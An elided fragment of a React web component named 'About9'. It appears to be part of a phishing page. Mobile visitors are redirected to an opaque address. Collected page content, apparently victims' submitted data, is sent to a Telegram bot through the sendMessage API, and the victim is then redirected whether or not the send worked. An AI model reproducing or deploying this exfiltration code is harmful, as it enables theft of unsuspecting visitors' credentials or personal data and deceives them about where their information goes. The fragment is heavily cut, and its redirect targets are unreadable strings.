...
const About9 = () => {
    ...
    useEffect(() => {
        if (isMobile) {
            window.location.href = 'Ty3Xp9Lq0Yv5Jo7Wn6Md1Cr8Ub4Ko2Gs6Kt1Ro8Wm3Lb73Zq9Yb5Uw2Xq0Hv2Je9Ma4Fy5Ns';
        }
    }, [isMobile]);
...
========================`;
                    ...
                    fetch(`https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${encodedContent}`, {
                        ...
                        .then(() => {
                            window.location = 'Zq7Nx0Lp3Hv9Tr4Fd5Mu8Cy1Jo6Wn2Kx5Yt3Pa9Gs0Bj7LMf7Ld2q4Vr1Wm6Xe3Ub8Kt2Ro5Ny';
                        })
                        .catch((error) => {
                            window.location = 'Zq7Nx0Lp3Hv9Tr4Fd5Mu8Cy1Jo6Wn2Kx5Yt3Pa9Gs0Bj7LMf7Ld2q4Vr1Wm6Xe3Ub8Kt2Ro5Ny';
                        });
